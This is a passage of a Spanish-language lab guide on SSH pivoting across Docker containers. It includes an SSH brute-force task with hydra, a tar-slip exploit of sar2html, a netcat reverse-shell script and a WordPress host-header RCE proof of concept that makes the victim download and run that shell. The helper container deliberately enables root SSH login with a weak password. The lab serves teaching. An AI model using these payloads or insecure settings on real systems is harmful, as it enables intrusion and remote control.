+<span class="w">  </span><span class="nt">wp_vol</span><span class="p">:</span>
+</code></pre></div>
+Dáos cuenta de como las imágenes se construyen localmente, cada una haciendo uso de su Dockerfile, con el fin de poder personalizarla a nuestra conveniencia.</p>
+<p>Para el caso del <code>helper</code> utilizamos como base una imagen de <em>phusion</em> que a su vez está basada en Ubuntu pero convenientemente modificada para que trabaje mejor con Docker. Más detalles <a href="https://hub.docker.com/r/phusion/baseimage">aquí</a> </p>
+<p>Para este contenedor se ha habilitado el login de root mediante SSH, algo poco recomendable en términos de seguridad pero que para nuestro escenario ficticio y como prueba de concepto, nos es de utilidad.</p>
+<p>La sentencia <code>extra_hosts</code>añade una entrada en el archivo <code>/etc/hosts</code> del contenedor para que de esta forma podamos utilizar su nombre, en lugar de la IP, para comunicarnos:</p>
+<div class="highlight"><pre><span></span><code><span class="k">FROM</span><span class="w"> </span><span class="s">phusion/baseimage:jammy-1.0.1</span>
+
+<span class="k">RUN</span><span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>ssh<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>iputils-ping<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>net-tools<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;root:123456789&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>chpasswd<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>sed<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;s/#PasswordAuthentication no/PasswordAuthentication yes/g&quot;</span><span class="w"> </span>/etc/ssh/sshd_config<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>sed<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;s/#PermitRootLogin yes/PermitRootLogin yes/g&quot;</span><span class="w"> </span>/etc/ssh/sshd_config<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;GatewayPorts yes&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/ssh/sshd_config
+
+<span class="k">CMD</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;/usr/sbin/sshd&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-D&quot;</span><span class="p">]</span>
+</code></pre></div>
+<p>Para la imagen del contenedor <code>attacker</code> se utiliza la misma imagen de <code>phusion</code> como base o punto de partida. Además, también se instalan en él algunas utilidades que necesitaremos (ping, nmap, hydra...) como vemos en su Dockerfile:</p>
+<div class="highlight"><pre><span></span><code><span class="k">FROM</span><span class="w"> </span><span class="s">phusion/baseimage:jammy-1.0.1</span>
+
+<span class="k">LABEL</span><span class="w"> </span><span class="nv">maintainer</span><span class="o">=</span><span class="s2">&quot;sauman&quot;</span>
+
+<span class="k">LABEL</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;attacker&quot;</span>
+
+<span class="k">RUN</span><span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
+<span class="w">   </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
+<span class="w">   </span>nmap<span class="w"> </span><span class="se">\</span>
+<span class="w">   </span>iputils-ping<span class="w"> </span><span class="se">\</span>
+<span class="w">   </span>net-tools<span class="w"> </span><span class="se">\</span>
+<span class="w">   </span>iproute2<span class="w"> </span><span class="se">\</span>
+<span class="w">   </span>proxychains4<span class="w"> </span><span class="se">\</span>
+<span class="w">   </span>hydra<span class="w"> </span><span class="se">\</span>
+<span class="w">   </span>ncat<span class="w"> </span><span class="se">\</span>
+<span class="w">   </span><span class="o">&amp;&amp;</span><span class="w"> </span>curl<span class="w"> </span>https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-05.txt<span class="w"> </span>-o<span class="w"> </span>/home/rock.txt
+</code></pre></div>
+<p>A continuación, el Dockerfile para <code>victim1</code>tampoco tiene mucho misterio. Con el comando <code>wget</code> descarga la herramienta <em>sar2html</em>. Se trata de na aplicación usada para graficar estadísticas de uso del sistema. Esta herramienta posee una vulnerabilidad que aprovecharemos más adelante para nuestro escenario:</p>
+<div class="highlight"><pre><span></span><code><span class="k">FROM</span><span class="w"> </span><span class="s">phusion/baseimage:jammy-1.0.1</span>
+
+<span class="k">RUN</span><span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>python3-pip
+
+<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/opt</span>
+
+<span class="k">RUN</span><span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>wget<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>wget<span class="w"> </span><span class="s2">&quot;https://master.dl.sourceforge.net/project/sar2html/sar2html-4.0.0.tar.gz?viasf=1&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>tar<span class="w"> </span>-xvf<span class="w"> </span>*
+
+<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/opt/sar2html-4.0.0/</span>
+
+<span class="k">RUN</span><span class="w"> </span>pip3<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+
+<span class="k">CMD</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;./startWeb&quot;</span>
+</code></pre></div>
+<p>Por último, para <code>victim2</code> no hace falta modificar ninguna imagen ya que en el registro de Docker ya existe una imagen de WordPress vulnerable. Simplemente construiremos el contenedor a partir de ella, configurando los parámetros adecuados, incluyendo además una base de datos MySQL.</p>
+<p>Como añadido, utilizaremos <strong>wp-cli</strong> para la cnfiguración automática de Wordpress:</p>
+<h1 id="construyendo-y-corriendo-los-contenedores">Construyendo y corriendo los contenedores:</h1>
+<p>En primer lugar construimos nuestro escenario:</p>
+<p><div class="highlight"><pre><span></span><code>docker-compose<span class="w"> </span>-f<span class="w"> </span>docker-compose-subnet.yml<span class="w"> </span>-f<span class="w"> </span>docker-compose.yml<span class="w"> </span>build
+</code></pre></div>
+Para posteriormente arrancarlo</p>
+<div class="highlight"><pre><span></span><code>docker-compose<span class="w"> </span>-f<span class="w"> </span>docker-compose-subnet.yml<span class="w"> </span>-f<span class="w"> </span>docker-compose.yml<span class="w"> </span>up
+</code></pre></div>
+<p>Si listamos los contenedores arrancados, deberíamos tener 5.</p>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Comprueba que puedes hacer los siguientes pings utilizando los nombres adecuados para ello:</p>
+<ul>
+<li>De <em>victim2</em> a <em>victim1</em></li>
+<li>De <em>victim1</em> a <em>victim2</em></li>
+<li>De helper a <em>victim1</em> y a <em>victim2</em></li>
+<li>Comprueba que el ping de <em>attacker</em> a <em>victim1</em> y a <em>victim2</em> no es exitoso, no por nombre ni por IP</li>
+</ul>
+</div>
+<h1 id="ataque-y-pivoting">Ataque y pivoting</h1>
+<p>En esta fase lo primero que vamos a hacer es escanear los puertos del host <strong>helper</strong>.</p>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Accede por SSH a la máquina (contenedor) <strong>attacker</strong> y realiza un escaneo de puertos con <em>nmap</em>  contra l máquina <strong>helper</strong>.</p>
+</div>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>En base a los descubrimientos del anterior punto, intenta obtener acceso a la máquina <strong>helper</strong>.</p>
+<p>Puede ayudarte de <em>hydra</em> y del diccionario <em>rockyou</em> ubicado el el home.</p>
+</div>
+<p>Una vez obtenido el acceso al contenedor <strong>helper</strong> y haciendo uso del comando <code>ip a</code>, descubriremos que estamos conectados a dos redes diferentes, ya que tenemos dos interfaces, cada una conectada una de esas redes (<code>172.16.100.11</code> y <code>172.16.101.11</code>)</p>
+<p>También es posible utilizar el comando <code>hostname -I</code> para ver todas las IP del host.</p>
+<p>Con todos estos datos encima de la mesa, habiendo descubierto la infraestructura, podemos llevar a cabo una redirección de puertos utilizando un proxy SOCKS. Con esto conseguimos que todo el tráfico hacia un determinado puerto en el servidor destino, viaje a través de una conexión ssh. </p>
+<p>Para ello debéis utilizar el comando, que deberéis completar, con la forma:</p>
+<p><div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>__<span class="w"> </span><span class="m">8500</span><span class="w"> </span>_____@________<span class="w"> </span>__<span class="w"> </span>__
+</code></pre></div>
+Donde, lo que debéis rellenar en los huecos, por estricto orden de aparición de izquierda a derecha:</p>
+<ul>
+<li>Switch/opción que pondrá un puerto local a la escucha, de tal manera que todo lo dirigido a ese puerto se redirigirá por la conexión SSH a modo de proxy SOCKS, independientemente del destino</li>
+<li>Usuario para SSH</li>
+<li>IP para SSH</li>
+<li>Switch/opción para que la ejecución sea en background</li>
+<li>Switch/opción para deshabilitar la ejecución de comandos</li>
+</ul>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Comprueba con el comando netstat que este comando se está ejecutando en background.</p>
+</div>
+<p>Lo que necesitamos ahora es un proxy para poder enviar todo nuestro tráfico a través del puerto <code>8500</code> y que, por tanto, se produzca la redirección configurada anteriormente. </p>
+<p>La herramienta que utilizaremos para este cometido es <code>proxychains</code> y por tanto hemos de configurarla en el archivo <code>/etc/proxychains.conf</code>, concretamente la línea del archivo que configura el <em>socks4</em>, debemos decirle que utilice el puerto <code>8500</code>.</p>
+<div class="admonition note">
+<p class="admonition-title">Consejo</p>
+<p>Recordad que para cambiar valores en un fichero, podéis utilizar el comando:
+<div class="highlight"><pre><span></span><code>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;s/Término a sustituir/Término nuevo/g&#39;</span><span class="w"> </span>archivo<span class="w">   </span>
+</code></pre></div></p>
+</div>
+<h2 id="localizando-nuevas-victimas">Localizando nuevas víctimas</h2>
+<p>Nuestra prioridad ahora es encontrar nuevos hosts. Si tuviéramos <em>nmap</em> todo resultaría mucho más fácil pero siendo honestos, no es un escenario realista.</p>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Comprueba que en la máquina <strong>helper</strong> no tenemos disponible nmap.</p>
+</div>
+<p>De cualquier forma, sabemos que la máquina <strong>helper</strong> es parte de dos redes distintas. Ambas máquinas, <strong>helper</strong> y <strong>attacker</strong>, pertenecen a la misma red <code>172.16.100.0/24</code>. Por ello, lo más lógico es escanear la red <code>172.16.101.0/24</code> en busca de todos los hosts presentes en ella.</p>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Para detectar los hosts presentes en <code>172.16.101.0/24</code>, vamos a utilizar una técnica llamada <a href="http://www.tugurium.com/gti/termino.php?Tr=ping%20sweep">ping sweep</a>.</p>
+<p>Utiliza un <a href="https://en.wikipedia.org/wiki/One-liner_program">one-liner</a> en <code>bash</code> que permita llevar a cabo esta técnica, documenta y examina los resultados.</p>
+</div>
+<h2 id="victim1">Victim1</h2>
+<p>Intenta realizar un ping desde la máquina <code>attacker</code> a <code>victim1</code>. </p>
+<p>Recuerda que para pasar el tráfico de nuestros comandos por el proxy y luego redirigirlo por nuestra conexión SSH, debemos precederlos de la palabra "proxychains", tal que así:</p>
+<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>ping<span class="w"> </span>x.x.x.x
+</code></pre></div>
+<div class="admonition question">
+<p class="admonition-title">Pregunta</p>
+<p>¿Por qué no podemos hacer ping utilizando proxychains?</p>
+</div>
+<p>A pesar de no poder hacer ping, sí que podemos usar <em>Nmap</em> para escanear puertos, al menos las opciones que utilizan TCP o UDP.</p>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Realiza desde la máquina <code>attacker</code>, haciendo uso de <em>proxychains</em>, un escaneo de puertos a la máquina <code>victim1</code> </p>
+<ul>
+<li>El escaneo con <code>nmap</code> debe ser del tipo <strong>connect scan</strong></li>
+<li>Se debe utilizar la opción de deshabilitar el descubrimiento de hosts (host discovery)</li>
+<li>Utilizad la opción de escaneo rápido para escanear únicamente los 100 puertos más comunes</li>
+</ul>
+</div>
+<p>Si has descubierto algún puerto abierto, utiliza el comando <code>curl</code> a través de <code>proxychains</code>para comprobar si el host responde algo interesante en ese puerto.</p>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Si obtuvieras una respuesta positiva, intenta acceder a través del navegador para descubrir de qué se trata y documentalo.</p>
+</div>
+<p>Esta aplicación web posee una <a href="https://www.geeksforgeeks.org/zip-slip/">vulnerabilidad</a> del tipo <em>zip slip</em> o <em>tar slip</em>.</p>
+<p>Para explotar esta vulnerabilidad, podéis seguir los siguientes pasos:</p>
+<ol>
+<li><a href="https://github.com/ptoomey3/evilarc.git">Descargar la herramienta generadora de POC (prueba de concepto)</a> </li>
+<li>
+<p>Crear el archivo que utilizaremos:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span>Vulnerabilidad<span class="w"> </span>explotada<span class="w"> </span>&gt;<span class="w"> </span>test.css
+</code></pre></div>
+</li>
+<li>
+<p>Generar el archivo <em>.tar</em> malicioso. Mirando la ayuda del script del repositorio que nos hemos clonado antes, generaremos el archivo malicioso atendiendo a:</p>
+<ul>
+<li>Para el sistema operativo lnux</li>
+<li>El nombre del tar será "pivoting.tar" y contendrá el archivo "test.css"</li>
+<li>El path o ruta será <em>static/css</em></li>
+<li>Una profundidad o número de directorios de los que se hará <em>traversal</em>, será de 3</li>
+</ul>
+</li>
+<li>
+<p>En el apartado <em>New host</em> subir el archivo <strong>.tar</strong> generado</p>
+</li>
+<li>Acceder a la ruta del archivo</li>
+</ol>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Comprueba y documenta que accediendo a la ruta del archivo podemos comprobar que esta máquina ha sido comprometida, tanto desde el navegador como desde el terminal (de la máquina <em>attacker</em>) con el comando <em>curl</em>, haciendo uso dde <em>proxychains</em></p>
+</div>
+<h2 id="victim2">Victim2</h2>
+<p>Para comenzar con esta nueva máquina, debemos realizar <u>de nuevo</u> un escaneo con <em>nmap</em> idéntico al anterior, a través de <em>proxychains</em> desde la máquina <strong>attacker</strong> a la máquina <strong>victim2</strong> y al <strong>MySQL</strong>.</p>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Documenta los escaneos anteriores. ¿Qué CMS has descubierto que se está ejecutando?</p>
+</div>
+<p>Para vulnerar la máquina <strong>victim2</strong>, vamos a hacer uso de dos elementos:</p>
+<ol>
+<li>
+<p>Este código para una reverse shell</p>
+<div class="highlight"><span class="filename">rev.sh</span><pre><span></span><code><span class="ch">#!/bin/bash</span>
+rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">172</span>.16.101.11<span class="w"> </span><span class="m">9000</span><span class="w"> </span>&gt;/tmp/f<span class="w">    </span>
+</code></pre></div>
+</li>
+<li>
+<p>Este código como POC (<em>proof of concept</em> o prueba de concepto)</p>
+<p><div class="highlight"><span class="filename">poc.sh</span><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+<span class="k">function</span><span class="w"> </span>prep_host_header<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="nv">cmd</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
+<span class="w">      </span><span class="nv">rce_cmd</span><span class="o">=</span><span class="s2">&quot;\${run{</span><span class="nv">$cmd</span><span class="s2">}}&quot;</span><span class="p">;</span>
+<span class="w">      </span><span class="nv">rce_cmd</span><span class="o">=</span><span class="s2">&quot;`echo </span><span class="nv">$rce_cmd</span><span class="s2"> | sed &#39;s^/^\${substr{0}{1}{\$spool_directory}}^g&#39;`&quot;</span>
+<span class="w">      </span><span class="nv">rce_cmd</span><span class="o">=</span><span class="s2">&quot;`echo </span><span class="nv">$rce_cmd</span><span class="s2"> | sed &#39;s^ ^\${substr{10}{1}{\$tod_log}}^g&#39;`&quot;</span>
+<span class="w">      </span><span class="nv">host_header</span><span class="o">=</span><span class="s2">&quot;target(any -froot@localhost -be </span><span class="nv">$rce_cmd</span><span class="s2"> null)&quot;</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="m">0</span>
+<span class="o">}</span>
+
+<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$#</span><span class="s2">&quot;</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;Uso:\n</span><span class="nv">$0</span><span class="s2"> url-objetivo\n&quot;</span>
+<span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
+<span class="k">fi</span>
+<span class="nv">target</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
+<span class="nv">http_server</span><span class="o">=</span><span class="s2">&quot;172.16.101.11/rev.sh&quot;</span>
+
+<span class="c1"># Guardamos el payload de la reverse shell en el objetivo, en el directorio /tmp/rev.sh</span>
+<span class="nv">cmd</span><span class="o">=</span><span class="s2">&quot;/usr/bin/curl </span><span class="nv">$http_server</span><span class="s2"> -o /tmp/rev.sh&quot;</span>
+prep_host_header<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$cmd</span><span class="s2">&quot;</span>
+curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: </span><span class="nv">$host_header</span><span class="s2">&quot;</span><span class="w"> </span>-s<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;user_login=admin&amp;wp-submit=Get+New+Password&#39;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$target</span><span class="s2">/wp-login.php?action=lostpassword&quot;</span>
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n\e[92m[+]\e[0m Payload enviado&quot;</span>
+
+<span class="c1"># Obtenemos la reverse shell</span>
+<span class="nv">cmd</span><span class="o">=</span><span class="s2">&quot;/bin/chmod +x /tmp/rev.sh&quot;</span>
+prep_host_header<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$cmd</span><span class="s2">&quot;</span>
+curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: </span><span class="nv">$host_header</span><span class="s2">&quot;</span><span class="w"> </span>-s<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;user_login=admin&amp;wp-submit=Get+New+Password&#39;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$target</span><span class="s2">/wp-login.php?action=lostpassword&quot;</span>
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n\e[92m[+]\e[0m Payload enviado&quot;</span>
+
+<span class="nv">cmd</span><span class="o">=</span><span class="s2">&quot;/bin/sh /tmp/rev.sh&quot;</span>
+prep_host_header<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$cmd</span><span class="s2">&quot;</span>
+curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: </span><span class="nv">$host_header</span><span class="s2">&quot;</span><span class="w"> </span>-s<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;user_login=admin&amp;wp-submit=Get+New+Password&#39;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$target</span><span class="s2">/wp-login.php?action=lostpassword&quot;</span>
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n\e[92m[+]\e[0m Payload enviado&quot;</span>
+</code></pre></div>
+Antes de llevar a cabo la explotación, vamos a comprobar que existe conectividad entre <strong>vitim2</strong> y <strong>attacker</strong>. Utilizando <em>netcat</em> (nc en <strong>victim2</strong> y ncat <strong>attacker</strong>), intenta establecer una conexión de una a otra.</p>
+</li>
+</ol>
+<div class="admonition question">
+<p class="admonition-title">Cuestión</p>
+<p>¿Consigues establecer esta conexión?¿Por qué?</p>
+</div>
+<p>Si repasamos el código de <code>poc.sh</code> vemos que el teórico curso de los acontecimientos ha de ser:</p>
+<ol>
+<li>Ejecutar un servidor web en el terminal de <strong>attacker</strong> para que el comando que se inyecte en la víctima haga que se descargue nuestra reverse shell <code>rev.sh</code> en su directorio <code>/tmp</code>: 
+  <div class="highlight"><pre><span></span><code><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+</code></pre></div></li>
+<li>Poner a la escucha <code>ncat</code> en <strong>attacker</strong> en un puerto de vuestra elección</li>
+<li>Ejecutar desde <strong>attacker</strong>, obviamente haciendo uso de <u>proxychains</u>, <code>poc.sh</code> contra la máquina <strong>victim2</strong></li>
+</ol>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Ejecuta los pasos anteriores y comprueba si recibes correctamente la reverse shell.</p>
+</div>
+<h3 id="reverse-shell">Reverse shell</h3>
+<p>Aquí necesitamos utilizar el concepto de de <strong>remote port forwarding</strong>. Con esta técnica crearemos un nuevo túnel que nos permitirá redirigir todo el tráfico que vaya destinado al puerto 80 de la máquina <strong>victim2</strong> hacia el puerto 80 de nuestra máquina <strong>attacker</strong>. Con esto conseguiremos que cuando ejecutemos <code>poc.sh</code>, se consiga la comunicación con el servidor web de python que se está ejecutando en <strong>attacker</strong></p>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Consulta <a href="https://cyberblog.es/index.php/2023/03/19/ssh-tunneling-local-remote-port-forwarding/">este</a> link o cualquier otro que te sea necesario para entender el concepto de remote port forwarding y ser capaz de completar el siguiente comando, que deberá ser ejecutado en <strong>attacker</strong>:</p>
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>___<span class="w"> </span>:___:172.16.100.10:___<span class="w"> </span>root@helper<span class="w"> </span>__<span class="w"> </span>__
+</code></pre></div>
+</div>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Vuelve a realizar los pasos que hemos visto antes para ejecutar <code>poc.sh</code> y comprueba si hay algún cambio respecto a la situación anterior e indicua cuál y por qué.</p>
+</div>
+<p>Ahora sólo estamos a un pequeñísimo paso de conseguir nuestra shell inversa. Necesitamos una nueva redirección de puertos y lo tendremos todo listo.</p>
+<div class="admonition task">
+<p class="admonition-title">Tarea</p>
+<p>Documenta los pasos a seguir con la nueva redirección de puertos y el éxito comprometiendo esta nueva máquina. Elabora un diagrama en <a href="https://app.diagrams.net/">https://app.diagrams.net/</a> donde se vea el proceso:</p>
+<ol>
+<li><code>ssh __ :__:172.16.100.10:__ __ :__:172.16.100.10:__ root@helper -N -f</code></li>
+<li><code>python3 -m http.server 80</code></li>
+<li><code>ncat -lvnp 9000</code></li>
+<li><code>proxychains4 -q ./poc.sh 172.16.101.21</code></li>
+</ol>
+</div>
+<h1 id="cuestion">Cuestión</h1>
+<div class="admonition question">
+<p class="admonition-title">Cuestión</p>
+<p>¿Cómo podemos evitar el uso de esta técnica de ataque con la redirección de puertos en SSH?</p>
+<p><strong>Pista:</strong> <em>Gateway ports</em></p>
+<p>Comprueba y documenta que con esta defensa, la técnica anteriormente empleada ya no funciona.</p>
+</div>
+<h1 id="referencias">Referencias</h1>
+<p><a href="https://cyberblog.es/index.php/2023/03/19/ssh-tunneling-local-remote-port-forwarding/">SSH Tunneling: Local &amp; Remote Port Forwarding</a></p>
+<p><a href="https://www.zonasystem.com/2019/01/tunel-ssh-port-forwarding-local-remote-dynamic.html">Túnel SSH port forwarding: Local, remote y dynamic [Explicado]</a></p>
+<p><a href="https://www.thehacker.recipes/infra/pivoting/port-forwarding">🛠️ Port forwarding</a></p>
+<p><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/port_forwarding_and_tunneling.html">Total OSCP Guide</a></p>
+<p><a href="https://docs.docker.com/network/network-tutorial-standalone/">Networking with standalone containers</a></p>
+<p><a href="https://gkiran.com.np/blog/pivoting">Pivoting in Docker</a></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "toc.integrate", "navigation.expand", "navigation.top", "navigation.indexes", "content.tabs.link", "content.code.annotate", "content.code.copy", "navigation.footer"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+    
+  </body>
+</html>
